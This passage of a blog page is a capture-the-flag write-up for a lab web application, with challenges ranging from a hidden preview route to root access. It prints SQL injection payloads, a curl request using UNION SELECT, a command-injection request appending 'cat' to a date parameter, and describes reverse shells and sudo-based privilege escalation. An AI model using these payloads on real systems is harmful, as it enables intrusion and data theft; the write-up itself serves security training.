+<p><img src="https://hackmd.io/_uploads/r1Hvap9ua.png" alt="the dashboard containing an image of the flag"></p>
+<h3 id="flag-2"><a href="#flag-2">Flag</a></h3>
+<p><code>OMEGAPOINT{7774447bfebcb09e9528c9da49fd4ab3}</code></p>
+<h2 id="3-going-internal"><a href="#3-going-internal">[3] Going Internal</a></h2>
+<h3 id="description-3"><a href="#description-3">Description</a></h3>
+<blockquote><p>We love the .NET ecosystem and rewrote the whole web UI in an unarguably better framework! However, it’s currently in preview, and we’re not giving you the link to it.</p></blockquote>
+<h3 id="solution-3"><a href="#solution-3">Solution</a></h3>
+<p>The challenge description hints at an existing .NET web application that is in preview. To uncover this link, one could figure out that the link to this page should be somehow found within the bundled source code. A thorough examination of the components used in various endpoints is, therefore, required. Doing so, we can find some suspiciously strange logic on an <code>onClick</code>-event handler attached to a button on the endpoint of <code>/dashboard</code>:</p>
+<pre class="language-js"><!-- HTML_TAG_START --><code class="language-js"><span class="token keyword">const</span> <span class="token function-variable function">o</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=></span><span class="token punctuation">&#123;</span>
+        window<span class="token punctuation">.</span>location<span class="token punctuation">.</span>hash<span class="token punctuation">.</span><span class="token function">endsWith</span><span class="token punctuation">(</span><span class="token string">"???"</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>window<span class="token punctuation">.</span>location<span class="token punctuation">.</span>href <span class="token operator">=</span> <span class="token function">atob</span><span class="token punctuation">(</span><span class="token string">"L3ByZXZpZXctdjI="</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+    <span class="token punctuation">&#125;</span></code><!-- HTML_TAG_END --></pre>
+<p>From the looks of it, navigating to the endpoint with a hash of <code>???</code>, thus<code>/dashboard#???</code>, redirects the user to some strange base64-encoded address. Decoding this address reveals it to be <code>/preview-v2</code>, leading to the discovery of an application built with .NET using the Blazor framework. The flag lies within the homepage of this Blazor application.</p>
+<p><img src="https://hackmd.io/_uploads/By-YTT5da.png" alt="preview of the web application"></p>
+<h3 id="flag-3"><a href="#flag-3">Flag</a></h3>
+<p><code>OMEGAPOINT{ccb37d76162deb4461bc2ac3026ef71c}</code></p>
+<h2 id="4-admin-rights-for-everybody"><a href="#4-admin-rights-for-everybody">[4] Admin rights for everybody!</a></h2>
+<h3 id="description-4"><a href="#description-4">Description</a></h3>
+<blockquote><p>To unlock the dashboard’s full potential, it appears you’ll need admin privileges. Investigate the authentication mechanism at the login endpoint, which seems to involve SQL.</p></blockquote>
+<h3 id="solution-4"><a href="#solution-4">Solution</a></h3>
+<p>Beyond the client-side functionality, certain endpoints were associated with a backend API, specifically, <code>/api/login</code> and <code>/api/notes</code>. An investigation into the login endpoint prompted exploration into potential vulnerabilities. Fuzzing the form fields with various characters, such as <code>&#39;</code>, aimed to provoke errors that might inadvertently expose hidden or detailed messages.</p>
+<blockquote><p>A helpful list for testing user-input data is <a href="https://github.com/minimaxir/big-list-of-naughty-strings" rel="noopener" class="text-link" target="_blank">The Big List of Naughty Strings</a>. It’s a collection of strings that often cause problems when used as input. For instance, the character <code>&#39;</code> is one of those known for causing issues.</p></blockquote>
+<p>This probing, tracked through analysing the network traffic, triggers an error message that inadvertently discloses the SQL query used in the backend. Evidently, the developers failed to implement parameterized queries, exposing the following SQL injection flaw:</p>
+<pre class="language-json"><!-- HTML_TAG_START --><code class="language-json"><span class="token punctuation">&#123;</span>
+  <span class="token property">"status"</span><span class="token operator">:</span> <span class="token string">"error"</span><span class="token punctuation">,</span>
+  <span class="token property">"error"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
+    <span class="token property">"name"</span><span class="token operator">:</span> <span class="token string">"SqlError"</span><span class="token punctuation">,</span>
+    <span class="token property">"sqlMessage"</span><span class="token operator">:</span> <span class="token string">"You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near 'a'' at line 1"</span><span class="token punctuation">,</span>
+    <span class="token property">"sql"</span><span class="token operator">:</span> <span class="token string">"SELECT id, username, isAdmin FROM users WHERE username='a'' AND password='a'; - parameters:[]"</span><span class="token punctuation">,</span>
+    <span class="token property">"fatal"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>
+    <span class="token property">"errno"</span><span class="token operator">:</span> <span class="token number">1064</span><span class="token punctuation">,</span>
+    <span class="token property">"sqlState"</span><span class="token operator">:</span> <span class="token string">"42000"</span><span class="token punctuation">,</span>
+    <span class="token property">"code"</span><span class="token operator">:</span> <span class="token string">"ER_PARSE_ERROR"</span>
+  <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span></code><!-- HTML_TAG_END --></pre>
+<p>With this, one can essentially access the entire database, including all notes and users. As the challenge involves obtaining admin privileges on the site, gaining access to an admin user is necessary. Through SQL injection, one can navigate through the users by using SQL clauses like <code>LIMIT</code> and <code>OFFSET</code>.</p>
+<p>Setting the subsequent payload as the username grants access to a user with the flag as their username. Further adjustment by an offset of 2 unveils access to the admin user:</p>
+<pre class="language-sql"><!-- HTML_TAG_START --><code class="language-sql">' <span class="token operator">OR</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span> <span class="token keyword">LIMIT</span> <span class="token number">1</span> <span class="token keyword">OFFSET</span> <span class="token number">1</span> <span class="token comment">-- - User with flag</span></code><!-- HTML_TAG_END --></pre>
+<pre class="language-sql"><!-- HTML_TAG_START --><code class="language-sql">' <span class="token operator">OR</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span> <span class="token keyword">LIMIT</span> <span class="token number">1</span> <span class="token keyword">OFFSET</span> <span class="token number">2</span> <span class="token comment">-- - Admin user</span></code><!-- HTML_TAG_END --></pre>
+<p><img src="https://hackmd.io/_uploads/HyxsTpqOT.png" alt="logged in as a user with the flag as the username"></p>
+<h3 id="flag-4"><a href="#flag-4">Flag</a></h3>
+<p><code>OMEGAPOINT{50e1ad3bbd85c57c528f06f84dafd174}</code></p>
+<h2 id="5-the-dreaded-lost-library"><a href="#5-the-dreaded-lost-library">[5] The Dreaded Lost Library</a></h2>
+<h3 id="description-5"><a href="#description-5">Description</a></h3>
+<blockquote><p>The reliance on libraries has inadvertently exposed hidden secrets of the web application. Can you find the exposed secret?</p></blockquote>
+<h3 id="solution-5"><a href="#solution-5">Solution</a></h3>
+<p>Moving to the preview web application built with the Blazor framework, one can see that most of the functionality is similar to the React application, being a client-side framework under WebAssembly in interpreted mode. Here, the .NET Mono runtime gets compiled into WebAssembly, loading and executing .NET assemblies through the runtime as DLL files. However, since the DLL files are built by the normal .NET compilation toolchain, and we know by the fact that C# compiles to bytecode alongside several metadatas before machine code, there’s a possibility of retrieving the source code by decompilation due to the nature of C# as a programming language as of .NET 7.</p>
+<p>Inspecting network traffic through devtools reveals numerous loaded DLL files, including <code>webapp2.dll</code>, likely containing the compiled assembly of the web application. Retrieving that said DLL file and using tools such as such as <a href="https://github.com/dnSpy/dnSpy" rel="noopener" class="text-link" target="_blank">dnSpy</a>, <a href="https://www.jetbrains.com/decompiler/" rel="noopener" class="text-link" target="_blank">dotPeek</a> and <a href="https://github.com/icsharpcode/ILSpy" rel="noopener" class="text-link" target="_blank">ILSpy</a> one can decompile it to access the source code.</p>
+<blockquote><p>The release of .NET 8 introduced the new WebCIL format as the default distribution format for .NET 8 Blazor wasm assemblies. As of the time of this writeup, it’s worth noting that there’s currently a gap in available decompilers as none support the WebCIL format. This transition in distribution format signifies advancements in .NET technology, yet simultaneously presents a challenge for reverse engineering or decompilation due to the lack of tools catering to this specific format.</p></blockquote>
+<p>Looking at the decompiled source code one can find the flag in the singleton <code>SharedStateService</code>:</p>
+<pre class="language-c#"><!-- HTML_TAG_START --><code class="language-c#">public class SharedStateService
+&#123;
+	public string Flag = &quot;OMEGAPOINT&#123;1da92dcfcbe4122b3e99cc25dc6d71d8&#125;&quot;;
+
+	[CompilerGenerated]
+	private Action? m_OnStateChange;
+
+	[field: CompilerGenerated]
+	public string Token
+	&#123;
+		[CompilerGenerated]
+		get;
+		[CompilerGenerated]
+		set;
+	&#125; = &quot;&quot;;
+
+
+	[field: CompilerGenerated]
+	public User? User
+	&#123;
+		[CompilerGenerated]
+		get;
+		[CompilerGenerated]
+		set;
+	&#125;
+
+	[field: CompilerGenerated]
+	public string CurrentPath
+	&#123;
+		[CompilerGenerated]
+		get;
+		[CompilerGenerated]
+		set;
+	&#125; = &quot;/preview-v2&quot;;
+
+
+	public event Action OnStateChange
+	&#123;
+		[CompilerGenerated]
+		add
+		&#123;
+			//IL_0010: Unknown result type (might be due to invalid IL or missing references)
+			//IL_0016: Expected O, but got Unknown
+			Action val = this.m_OnStateChange;
+			Action val2;
+			do
+			&#123;
+				val2 = val;
+				Action val3 = (Action)System.Delegate.Combine((System.Delegate)(object)val2, (System.Delegate)(object)value);
+				val = Interlocked.CompareExchange&lt;Action&gt;(ref this.m_OnStateChange, val3, val2);
+			&#125;
+			while (val != val2);
+		&#125;
+		[CompilerGenerated]
+		remove
+		&#123;
+			//IL_0010: Unknown result type (might be due to invalid IL or missing references)
+			//IL_0016: Expected O, but got Unknown
+			Action val = this.m_OnStateChange;
+			Action val2;
+			do
+			&#123;
+				val2 = val;
+				Action val3 = (Action)System.Delegate.Remove((System.Delegate)(object)val2, (System.Delegate)(object)value);
+				val = Interlocked.CompareExchange&lt;Action&gt;(ref this.m_OnStateChange, val3, val2);
+			&#125;
+			while (val != val2);
+		&#125;
+	&#125;
+
+	public void SetToken(string token)
+	&#123;
+		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
+		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
+		if (token.Length &gt; 0)
+		&#123;
+			JwtSecurityTokenHandler val = new JwtSecurityTokenHandler();
+			((TokenHandler)val).ReadToken(token);
+			SecurityToken obj = ((TokenHandler)val).ReadToken(token);
+			JwtSecurityToken val2 = (JwtSecurityToken)(object)((obj is JwtSecurityToken) ? obj : null);
+			if (val2 != null)
+			&#123;
+				try
+				&#123;
+					int id = Convert.ToInt32(val2.Claims.First((Claim claim) =&gt; claim.Type == &quot;id&quot;).Value);
+					string value = val2.Claims.First((Claim claim) =&gt; claim.Type == &quot;username&quot;).Value;
+					bool isAdmin = Convert.ToBoolean(Convert.ToInt32(val2.Claims.First((Claim claim) =&gt; claim.Type == &quot;isAdmin&quot;).Value));
+					User = new User(id, value, isAdmin);
+					Token = token;
+				&#125;
+				catch
+				&#123;
+				&#125;
+			&#125;
+		&#125;
+		else
+		&#123;
+			User = null;
+			Token = &quot;&quot;;
+		&#125;
+		NotifyStateChanged();
+	&#125;
+
+	public void SetCurrentPath(string path)
+	&#123;
+		CurrentPath = path;
+		NotifyStateChanged();
+	&#125;
+
+	private void NotifyStateChanged()
+	&#123;
+		Action? onStateChange = this.OnStateChange;
+		if (onStateChange != null)
+		&#123;
+			onStateChange.Invoke();
+		&#125;
+	&#125;
+&#125;
+</code><!-- HTML_TAG_END --></pre>
+<h3 id="flag-5"><a href="#flag-5">Flag</a></h3>
+<p><code>OMEGAPOINT{1da92dcfcbe4122b3e99cc25dc6d71d8}</code></p>
+<h2 id="6-dumping-the-barrel"><a href="#6-dumping-the-barrel">[6] Dumping the Barrel</a></h2>
+<h3 id="description-6"><a href="#description-6">Description</a></h3>
+<blockquote><p>As you explore the web application, you may find a way to access notes. However, even with admin privileges, accessing the note comments seems to not be possible.</p></blockquote>
+<h3 id="solution-6"><a href="#solution-6">Solution</a></h3>
+<p>From the previous findings, we know that the login endpoint enables the extraction of the entire database. Extracting the all values in the notes table, one can find the flag hidden as a comment on a note. Additionally, the decompiled source code from the DLL file revealed a filter parameter on the notes endpoint, vulnerable to SQL injection due to the lack of using parameterized queries as well. An illustrative payload showcasing the retrieval of comments from the notes table, including the flag, is demonstrated below:</p>
+<pre class="language-sh"><!-- HTML_TAG_START --><code class="language-sh">curl -H &#39;authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywidXNlcm5hbWUiOiJhZG1pbiIsImlzQWRtaW4iOjEsImlhdCI6MTcwMTE3MzQ4NiwiZXhwIjoxNzMyNzA5NDg2fQ.TFzllamMp0d7Rv9eIdRvvJHWr8-dk0h2iZSY1Z6nV5c&#39; &#39;http://51.120.250.68/api/notes?token=OMEGAPOINT%7B7c0e12caf742bf36e604250fa8cc70fd%7D&amp;filter=1=0%20UNION%20SELECT%201,2,comment%20FROM%20notes&#39;</code><!-- HTML_TAG_END --></pre>
+<p><img src="https://hackmd.io/_uploads/r1eVAp9da.png" alt="sqli on the notes-endpoint containing the flag"></p>
+<h3 id="flag-6"><a href="#flag-6">Flag</a></h3>
+<p><code>OMEGAPOINT{d4fba280dd6162ca55bdcb26feb12f05}</code></p>
+<h2 id="7-thats-right-you-can-read"><a href="#7-thats-right-you-can-read">[7] That’s right, you can read!</a></h2>
+<h3 id="description-7"><a href="#description-7">Description</a></h3>
+<blockquote><p>Certain debugging endpoints of the server have been exposed through the library. Can you exploit them to your advantage?</p></blockquote>
+<h3 id="solution-7"><a href="#solution-7">Solution</a></h3>
+<p>Through the decompiled source code, we can also see a debug endpoint at <code>/api/debug/date?format=</code>:</p>
+<pre class="language-c#"><!-- HTML_TAG_START --><code class="language-c#">[AsyncStateMachine(typeof(&lt;DebugDate&gt;d__7))]
+public async System.Threading.Tasks.Task&lt;string&gt; DebugDate()
+&#123;
+    //IL_0002: Unknown result type (might be due to invalid IL or missing references)
+    //IL_0007: Unknown result type (might be due to invalid IL or missing references)
+    HttpRequestMessage val = new HttpRequestMessage(HttpMethod.Get, &quot;/api/debug/date?format=%2B%25A%2C%20%25d.%25b%20%25Y%20-%20%25H%3A%25M%3A%25S&quot;);
+    ((HttpHeaders)val.Headers).Add(&quot;Authorization&quot;, &quot;Bearer &quot; + stateService.Token);
+    HttpResponseMessage val2 = (await httpClient.SendAsync(val)) ?? throw new System.Exception();
+    if (val2.IsSuccessStatusCode)
+    &#123;
+        return ((await JsonSerializer.DeserializeAsync&lt;DataResponse&gt;(await val2.Content.ReadAsStreamAsync(), (JsonSerializerOptions)null, default(CancellationToken))) ?? throw new System.Exception(&quot;Failed to deserialize response.&quot;)).Data ?? throw new System.Exception();
+    &#125;
+    return &quot;&quot;;
+&#125;</code><!-- HTML_TAG_END --></pre>
+<p>From the information within the application’s written notes, it becomes evident that the debug endpoints execute bash commands, and it seems that there is a command injection vulnerability in the format argument of the unix command <code>date</code>. Another way to discover this vulnerability involves probing the inputs within the endpoint and analysing the subsequent error messages. This underscores the significance of not exposing sensitive informations in error messages to prevent revealing potential security loopholes to users.</p>
+<p>With sites such as <a href="https://gtfobins.github.io/" rel="noopener" class="text-link" target="_blank">GTFOBins</a> one could quickly figure out the possibility for arbitrary file reads (<a href="https://gtfobins.github.io/gtfobins/date/" rel="noopener" class="text-link" target="_blank">https://gtfobins.github.io/gtfobins/date/</a>). Understanding that the backend is constructed with Express.js, exploring the file structure through <code>package.json</code> becomes feasible. Further inspection of the <code>index.js</code> file, housing the backend logic, unveils the flag being used as a token for another, more detailed debug endpoint.</p>
+<p><img src="https://hackmd.io/_uploads/B1SLRT5up.png" alt="Local File Read on the debug-endpoint"></p>
+<h3 id="flag-7"><a href="#flag-7">Flag</a></h3>
+<p><code>OMEGAPOINT{d8b732c8a1d3e796be06bb8b8a172e7a}</code></p>
+<h2 id="8-take-control"><a href="#8-take-control">[8] Take Control</a></h2>
+<h3 id="description-8"><a href="#description-8">Description</a></h3>
+<blockquote><p>Knowing how to read is a good start, but can you also figure out how to access the server? It’s necessary to figure out the parameters for the debugging endpoint.</p></blockquote>
+<h3 id="solution-8"><a href="#solution-8">Solution</a></h3>
+<p>It appears that during the CTF, unintended solutions were found in this challenge due to the flag file’s path being easily guessable. This allowed for one to directly read the file by deducing the system’s user and file structure.</p>
+<p>Addressing this, a potential solution involves making the flag file executable, mandating the need for Remote Code Execution (RCE) to access its content. Alternatively, introducing randomness or entropy into the file’s name could enhance its unpredictability, making it less prone to straightforward guesses.</p>
+<p>However, the intended and necessary solution to progress further to the next and final challenge requires achieving Remote Code Execution (RCE) within the system. The more detailed debug endpoint executes the Unix command <code>date</code> using <code>child_process.exec()</code> instead of <code>child_process.spawn()</code> in the last challenge, allowing for greater control over chaining multiple commands, thereby enabling for arbitrary RCE. For instance, appending a semicolon (<code>;</code>) followed by additional commands after executing date could serve as an example payload for achieving this RCE.</p>
+<pre class="language-sh"><!-- HTML_TAG_START --><code class="language-sh">curl -s -H &#39;authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywidXNlcm5hbWUiOiJhZG1pbiIsImlzQWRtaW4iOjEsImlhdCI6MTcwMTE3MzQ4NiwiZXhwIjoxNzMyNzA5NDg2fQ.TFzllamMp0d7Rv9eIdRvvJHWr8-dk0h2iZSY1Z6nV5c&#39; -H &#39;X-DEBUG: OMEGAPOINT&#123;d8b732c8a1d3e796be06bb8b8a172e7a&#125;&#39; &#39;http://51.120.250.68/api/debug/date?format=a;cat%20/home/user/flag.txt&#39;</code><!-- HTML_TAG_END --></pre>
+<p><img src="https://hackmd.io/_uploads/r1RBkM2_a.png" alt="remote code execution on the debug endpoint"></p>
+<h3 id="flag-8"><a href="#flag-8">Flag</a></h3>
+<p><code>OMEGAPOINT{8fe9deb64640640925372079449bfcb5}</code></p>
+<h2 id="9-i-am-groot"><a href="#9-i-am-groot">[9] I am groot!</a></h2>
+<h3 id="description-9"><a href="#description-9">Description</a></h3>
+<blockquote><p>You’re very close to the secret manuals now. Can you grow from a mere user to the mighty admin?</p></blockquote>
+<h3 id="solution-9"><a href="#solution-9">Solution</a></h3>
+<p>Exploring the system reveals the presence of an <code>admin</code> user, which currently remains beyond our control. To gain more comprehensive access and foothold on the system, spawning a reverse shell would be advantageous as well as making things easier for us to control. Additionally, geting access to an interactive tty-shell, would open up for certain commands and actions that would otherwise be restricted.</p>
+<blockquote><p>Sites such as <a href="https://www.revshells.com/" rel="noopener" class="text-link" target="_blank">revshells</a> can help in constructing payloads specifically designed to spawn a reverse shell on the target system.</p></blockquote>
+<p><img src="https://hackmd.io/_uploads/BJPuCp5_T.png" alt="reverse shell"></p>
+<p>With an interactive shell at our disposal, navigating and exploring the system becomes more convenient. Privilege Escalation, the next step, involves gaining higher-level permissions within a system or network. This phase is crucial as adversaries, despite having limited initial access, usually require elevated permissions to actually achieve their objectives.  Common approaches are to take advantage of system weaknesses such as misconfigurations or exploiting vulnerabilities in running applications. </p>
+<p>Tools like <a href="https://github.com/carlospolop/PEASS-ng" rel="noopener" class="text-link" target="_blank">LinPEAS</a> effectively identify misconfigurations, aiding in discovering paths to privilege escalation. In our case, one would discover a misconfiguration in the sudoers list, where the user <code>user</code> is granted the ability to execute the command <code>/usr/local/bin/node</code> as the <code>admin</code> user. </p>
+<p><img src="https://hackmd.io/_uploads/S1EdxCc_a.png" alt="listing the sudoers list"></p>
+<p>Leveraging this configuration allows us to execute arbitrary JavaScript code via <code>Node</code>, which essentially means that we have an arbitrary Remote Code Execution (RCE) as shown below. Running commands as the admin user is the final step to gaining access to the system, signifying the completion of the scenario-based challenges.</p>
+<p><img src="https://hackmd.io/_uploads/Hkn_e0cO6.png" alt="running commands as the admin user"></p>
+<h3 id="flag-9"><a href="#flag-9">Flag</a></h3>
+<p><code>OMEGAPOINT{df96d4cefdca2c0350017ec64ad20529}</code></p>
+</section></main>
+
+<footer class="svelte-13k2m7z"><p>Loosely designed in Figma by Shirajuki.<br>Built with sveltekit and SCSS</p>
+</footer>
+
+
+		<script type="module" data-sveltekit-hydrate="1k9yrnb">
+		import { set_public_env, start } from "/_app/immutable/start-91df4be7.js";
+
+		set_public_env({});
+
+		start({
+			target: document.querySelector('[data-sveltekit-hydrate="1k9yrnb"]').parentNode,
+			paths: {"base":"","assets":""},
+			session: {},
+			route: true,
+			spa: false,
+			trailing_slash: "never",
+			hydrate: {
+				status: 200,
+				error: null,
+				nodes: [0, 8],
+				params: {},
+				routeId: "blog/omegapoint-ctf-2023"
+			}
+		});
+	</script></div>
+  </body>
+</html>
